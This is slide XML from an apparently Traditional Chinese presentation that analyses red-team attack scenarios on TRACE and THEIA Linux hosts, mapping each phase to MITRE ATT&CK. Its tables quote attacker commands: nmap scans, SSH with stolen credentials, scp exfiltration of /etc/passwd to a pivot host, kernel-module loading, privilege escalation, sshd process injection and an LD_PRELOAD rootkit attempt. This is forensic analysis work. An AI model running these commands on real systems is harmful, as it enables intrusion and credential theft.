            <p:cNvPr id="263" name="Google Shape;26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34575" y="3035950"/>
              <a:ext cx="695725" cy="6957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4" name="Google Shape;264;p28"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6011788" y="3731675"/>
              <a:ext cx="741300" cy="5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zh-TW" sz="1000">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Malicious Website</a:t>
              </a:r>
              <a:endParaRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="265" name="Google Shape;265;p28"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="263" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="6845973" y="1771453"/>
            <a:ext cx="837000" cy="800100"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd fmla="val 91117" name="adj1"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6121098" y="4524778"/>
            <a:ext cx="7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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pivot</a:t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267" name="Google Shape;267;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="2133881">
            <a:off x="7203194" y="1689621"/>
            <a:ext cx="887690" cy="3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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Drakon APT</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="268" name="Google Shape;268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39610" y="1452702"/>
            <a:ext cx="199750" cy="19977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9" name="Google Shape;269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0800000">
            <a:off x="7094109" y="1460142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0" name="Google Shape;270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1928" y="1076484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1915" y="1460140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81936" y="1753000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1936" y="2083075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81923" y="2471863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1922" y="2961629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81914" y="3451392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8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81923" y="3840180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8" name="Google Shape;278;p2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0800000">
            <a:off x="281934" y="4228942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79" name="Google Shape;279;p2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81948" y="4617727"/>
            <a:ext cx="199750" cy="199771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TRACE (Linux / Ubuntu)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="285" name="Google Shape;285;p29"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="47625" y="1183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266825"/>
                <a:gridCol w="2000250"/>
                <a:gridCol w="2609850"/>
                <a:gridCol w="1466850"/>
                <a:gridCol w="17049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59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1: 早期偵查與橫向移動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(2019/05/10)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漏洞掃描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攻擊者從跳板機掃描確認 SSH 服務開啟。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nmap -sS -p 22 128.55.12.0/24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22/tcp open ssh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T1595.002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Active Scanning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確認目標存活。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憑證存取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利用先前獲取的憑證登入 SSH。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 admin@128.55.12.118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Warning: Permanently added...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Valid Accounts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成功以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身份登入。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資料竊取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Exfil 密碼檔。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scp passwd admin@128.55.12.149:.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T1041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Exfiltration Over C2 Channel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成功竊取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/etc/passwd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2: 瀏覽器路過式攻擊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(2019/05/14)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觸發瀏覽器後門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誘使目標瀏覽惡意網站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www.yale.edu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)，觸發 Firefox 預植後門。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ping www.yale.edu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128.55.12.167:54136 --&gt; ... [HTTP]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T1189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Drive-by Compromise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成功觸發後門，建立 C2 連線 (L1)。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TRACE (Linux / Ubuntu)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="291" name="Google Shape;291;p30"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="95250" y="1078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266825"/>
                <a:gridCol w="2000250"/>
                <a:gridCol w="2609850"/>
                <a:gridCol w="1466850"/>
                <a:gridCol w="17049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659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3: 植入物下載與執行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記憶體內執行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Firefox 行程下載並在記憶體中執行 Drakon APT。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[linux] [x64] ... NEW CONSOLE READY [L1]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T1059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Command and Scripting Interpreter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成功取得初始 Shell 權限 (uid: 1003 admin)。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58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4: 核心提權 (關鍵)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載入惡意核心模組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攻擊者上傳並載入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load_helper.ko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(BinFmt-Elevate)。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insmod ./load_helper.ko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sudo insmod ./read_scan.ko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T1547.006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Kernel Modules and Extensions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準備提權環境。這是利用 Linux 核心機制的攻擊。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觸發提權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利用核心模組漏洞將權限提升至 Root。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L1&gt;elevate test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elevate success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L1&gt;whoami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uid: 0 root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T1068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Exploitation for Privilege Escalation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成功取得 Root 權限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4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5: 防禦規避與持久化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行程探索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尋找適合隱藏的系統行程。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L1&gt;ps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16808 ... (sshd)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選定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(SSH Daemon) 作為注入目標。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TRACE (Linux / Ubuntu)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="297" name="Google Shape;297;p31"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="47625" y="1378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266825"/>
                <a:gridCol w="2000250"/>
                <a:gridCol w="2609850"/>
                <a:gridCol w="1466850"/>
                <a:gridCol w="17049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7493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5: 防禦規避與持久化</a:t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行程注入 (Inject2)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將惡意 Shellcode 注入至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行程中。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L1&gt;inject sc /e5/stage1/... 16808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inject success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Injection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代碼成功注入至合法的系統行程。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40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偽裝執行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從注入的行程中建立新的 C2 連線 (L2)，並關閉原始連線。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NEW CONSOLE READY [L2]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L2&gt;getpid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pid: 16808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T1036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Masquerading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攻擊者現在「寄生」在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行程內運作，極難被發現。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6: Rootkit 嘗試 (失敗)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(2019/05/17)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劫持環境變數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嘗試使用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LD_PRELOAD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載入 Azazel Rootkit。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export LD_PRELOAD=/lib/libselinux.so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T1574.006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Hijack Execution Flow: LD_PRELOAD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失敗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。未能成功建立 C2 連線。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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311711" y="204736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THEIA (Linux / Ubuntu)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03" name="Google Shape;303;p32"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="-3812275" y="-2992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1438275"/>
                <a:gridCol w="1476375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攻擊來源 (Attacker)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攻擊目標 (Victim)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跳板機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ta51-pivot-1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(128.55.12.149)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網段掃描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128.55.12.0/24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(含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跳板機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ta51-pivot-1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(128.55.12.149)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(128.55.12.110)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 (受控端)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(128.55.12.110)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接收端 (攻擊者)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ta51-pivot-1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(128.55.12.149)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攻擊操作機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kududyn-ProLiant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ta1-theia-target-3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(128.55.12.119)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 (受控端)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(128.55.12.110)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 (核心)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(128.55.12.110)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3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惡意網站/C2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208.203.20.42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(偽裝)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(真實)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 (瀏覽器)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(Firefox)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19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C2 Server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(Agent)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382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 (回報)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C2 Server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C2 Server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906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C2 Server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 (SSH程序)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(Target PID: 1162)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667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C2 Server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128.55.12.167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受害主機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304" name="Google Shape;304;p32"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="373308" y="8380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2755750"/>
                <a:gridCol w="3239750"/>
              </a:tblGrid>
              <a:tr h="299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說明</a:t>
                      </a:r>
                      <a:endParaRPr b="1"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286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T1046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Network Service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Discovery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攻擊者掃描網路尋找開放 SSH (Port 22) 的主機。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5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T1021.004</a:t>
                      </a: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Remote Services: SSH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T1078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Valid Accounts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使用已知/竊取的憑證進行橫向移動登入。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0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T1048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Exfiltration Over Alternative Protocol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將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/etc/passwd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檔案回傳。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5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T1570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Lateral Tool Transfer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攻擊者將攻擊工具/驅動程式上傳至環境中。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66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T1547.006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Kernel Modules and Extensions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載入惡意或脆弱的核心模組，為提權做準備。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42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T1189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Drive-by Compromise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T1203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Exploitation for Client Execution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透過瀏覽器漏洞觸發惡意程式下載與執行。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T1068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Exploitation for Privilege Escalation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利用共享記憶體漏洞將權限提升至 Root。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8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T1033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System Owner/User Discovery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確認當前使用者身分已成功變更為 Root。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8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T1057 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Process Discovery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攻擊者列出執行中的進程以尋找注入目標。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T1055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Process Injection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將 Shellcode 注入至合法的 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-TW" sz="10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進程中以隱藏蹤跡。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0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000">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1083</a:t>
                      </a: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 File and Directory Discovery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000">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>瀏覽受害系統的檔案目錄結構。</a:t>
                      </a:r>
                      <a:endParaRPr sz="10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305" name="Google Shape;30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972" y="3949789"/>
            <a:ext cx="695725" cy="6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32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6718184" y="4645514"/>
            <a:ext cx="7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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pivot</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="307" name="Google Shape;307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972" y="2231051"/>
            <a:ext cx="695725" cy="6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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6718184" y="2926776"/>
            <a:ext cx="7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0B57D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Theia-1</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="0B57D0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="309" name="Google Shape;309;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7035434" y="3265489"/>
            <a:ext cx="0" cy="68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10" name="Google Shape;310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21739" y="4170670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1" name="Google Shape;311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3596" y="350773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04322" y="350774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15222" y="350774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1759" y="2399961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5" name="Google Shape;315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44600" y="1836140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790586" y="1818324"/>
            <a:ext cx="199775" cy="19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7" name="Google Shape;317;p32"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="318" idx="0"/>
            <a:endCxn id="319" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="8152334" y="3251689"/>
            <a:ext cx="1800" cy="670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20" name="Google Shape;320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826205" y="1346938"/>
            <a:ext cx="199750" cy="19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10800000">
            <a:off x="7832951" y="1578265"/>
            <a:ext cx="199775" cy="199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32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7142009" y="3265476"/>
            <a:ext cx="0" cy="68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18" name="Google Shape;31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4472" y="3922489"/>
            <a:ext cx="695725" cy="6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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7781684" y="4618214"/>
            <a:ext cx="7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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ProLiant</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="324" name="Google Shape;32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06234" y="2217389"/>
            <a:ext cx="695725" cy="6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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7783447" y="2913114"/>
            <a:ext cx="741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0B57D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Theia-3</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="0B57D0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="325" name="Google Shape;325;p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773583" y="194742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0984" y="429589"/>
            <a:ext cx="695725" cy="695725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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6718197" y="1125314"/>
            <a:ext cx="7413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000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malicious Website</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="328" name="Google Shape;328;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7017619" y="1640951"/>
            <a:ext cx="0" cy="590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29" name="Google Shape;329;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7142009" y="1558189"/>
            <a:ext cx="0" cy="684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30" name="Google Shape;330;p32"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="307" idx="3"/>
            <a:endCxn id="326" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="7436696" y="777414"/>
            <a:ext cx="600" cy="1801500"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd fmla="val 5768576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31" name="Google Shape;331;p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7781686" y="1114760"/>
            <a:ext cx="199750" cy="1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914" y="1216320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3" name="Google Shape;33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1921" y="164093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1922" y="206554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3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11922" y="239994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11934" y="2704236"/>
            <a:ext cx="199775" cy="199775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37" name="Google Shape;337;p3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11925" y="3487203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11936" y="3815424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1943" y="4471863"/>
            <a:ext cx="199750" cy="19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 rot="10800000">
            <a:off x="111926" y="4143640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3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1933" y="3158978"/>
            <a:ext cx="199775" cy="19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1948" y="4800085"/>
            <a:ext cx="199750" cy="19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THEIA (Linux / Ubuntu)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48" name="Google Shape;348;p33"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="42850" y="9855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885825"/>
                <a:gridCol w="2505075"/>
                <a:gridCol w="2514600"/>
                <a:gridCol w="1647825"/>
                <a:gridCol w="150495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18192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1:初期偵查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網路掃描 (Network Scanning)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攻擊者從跳板機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ta51-pivot-1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使用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nmap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掃描網段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128.55.12.0/24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以發現開啟 SSH (Port 22) 的主機。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admin@ta51-pivot-1:~\$ sudo nmap ssp 22 128.55.12.0/24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Nmap scan report for ta1-theia-target-1-dp (128.55.12.110)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PORT STATE SERVICE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22/tcp open ssh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T1046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Network Service Scanning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成功發現 THEIA 目標主機 (Target 1, 2, 3 等) 開啟 SSH 服務。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571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2:橫向移動與存取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SSH 登入與憑證利用 (SSH Login with Valid Accounts)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利用已知的 admin 憑證透過 SSH 登入目標主機。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admin@ta51-pivot-1:~\$ ssh admin@128.55.12.110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Welcome to Ubuntu 12.04.5 LTS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admin@ta1-theia-target-1:~\$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T1021.004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Remote Services: SSH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T1078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Valid Accounts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成功取得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ta1-theia-target-1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的存取權限。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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="88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THEIA (Linux / Ubuntu)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54" name="Google Shape;354;p34"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="42850" y="780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885825"/>
                <a:gridCol w="2505075"/>
                <a:gridCol w="2514600"/>
                <a:gridCol w="1647825"/>
                <a:gridCol w="150495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9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3:資料竊取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透過 SCP 傳輸檔案 (Exfiltration via SCP)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將目標主機上的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/etc/passwd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檔案傳回攻擊者控制的機器。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admin@ta1-theia-target-1:~\$ scp passwd admin@128.55.12.149:.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passwd 100% 2696 2.6KB/s 00:00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T1048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Exfiltration Over Alternative Protocol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成功竊取密碼檔，用於後續分析或權限維持。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4:環境設置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載入核心模組 (Load Kernel Modules)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攻擊者預先上傳並載入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load_helper.ko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和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read_scan.ko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驅動程式，這被標記為良性活動，但為後續提權漏洞利用做準備。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scp load_helper_theia.ko admin@128.55.12.119:.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admin@ta1-theia-target-1:~\$ sudo insmod ./load_helper.ko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admin@ta1-theia-target-1:~\$ lsmod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T1547.006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Boot or Logon Autostart Execution: Kernel Modules and Extensions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為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BinFmt-Elevate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提權攻擊佈置環境。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5:初始存取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路過式下載/瀏覽器漏洞 (Drive-by Compromise)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利用 Firefox 後門，當使用者瀏覽被劫持的網站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www.nhra.com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時觸發惡意程式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Drakon APT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下載與執行。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Benign activity opened Firefox and browsed to http://www.nhra.com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(隱含於描述中)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MAIN&gt;list L1 ... 128.55.12.167:8108 [HTTP]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T1189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Drive-by Compromise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T1203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Exploitation for Client Execution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成功建立 C2 連線，Drakon APT 在記憶體中執行。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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="88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THEIA (Linux / Ubuntu)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360" name="Google Shape;360;p35"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="42850" y="7808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{EDA8854A-5CEE-4DB6-9554-F914725C1531}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="885825"/>
                <a:gridCol w="2505075"/>
                <a:gridCol w="2514600"/>
                <a:gridCol w="1647825"/>
                <a:gridCol w="1504950"/>
              </a:tblGrid>
              <a:tr h="514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攻擊階段 (Phase)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攻擊動作與技術 (Action &amp; Technique)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關鍵日誌證據 (Key Log Evidence)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對應 MITRE ATT&amp;CK TTP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結果/備註 (Outcome)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EFEF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="902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6:權限提升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利用核心漏洞提權 (Exploitation for Privilege Escalation)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Drakon APT 傳送指令利用先前載入的驅動程式漏洞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BinFmt-Elevate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將權限提升至 Root。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L1&gt;elevate shm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Elevate current process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elevate success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L1&gt;whoami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uid: 0 root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T1068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Exploitation for Privilege Escalation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攻擊者成功從普通使用者權限獲取 Root 權限。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511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7:發現與偵查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系統與進程發現 (System &amp; Process Discovery)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攻擊者執行指令列出系統進程與目錄檔案。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L1&gt;ps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1162 1 root (sshd)</a:t>
                      </a:r>
                      <a:endParaRPr sz="1100">
                        <a:solidFill>
                          <a:srgbClr val="444746"/>
                        </a:solidFill>
                        <a:highlight>
                          <a:srgbClr val="E9EEF6"/>
                        </a:highlight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L1&gt;cd /var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L1&gt;cd log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L1&gt;ls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T1057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T1083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File and Directory Discovery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識別出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進程作為注入目標。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963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Phase 8:防禦規避/潛伏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進程注入 (Process Injection)</a:t>
                      </a:r>
                      <a:endParaRPr b="1"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將惡意模組 (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sshd-linux-x64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) 注入到合法的 </a:t>
                      </a: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sshd</a:t>
                      </a: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 進程中以隱藏活動。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L1&gt;inject sc /e5/dist/sshd-linux-x64 1162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444746"/>
                          </a:solidFill>
                          <a:highlight>
                            <a:srgbClr val="E9EEF6"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>[*] inject success</a:t>
                      </a:r>
                      <a:endParaRPr baseline="30000" sz="2000">
                        <a:solidFill>
                          <a:srgbClr val="444746"/>
                        </a:solidFill>
                        <a:highlight>
                          <a:srgbClr val="FFFFFF"/>
                        </a:highlight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zh-TW" sz="1100">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055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Process Injection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100">
                          <a:solidFill>
                            <a:srgbClr val="1F1F1F"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>成功將惡意程式碼注入系統服務進程，增加檢測難度。</a:t>
                      </a:r>
                      <a:endParaRPr sz="1100">
                        <a:solidFill>
                          <a:srgbClr val="1F1F1F"/>
                        </a:solidFill>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="76200" marB="76200" marR="114300" marL="114300">
                    <a:lnL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7050">
                      <a:solidFill>
                        <a:srgbClr val="1F1F1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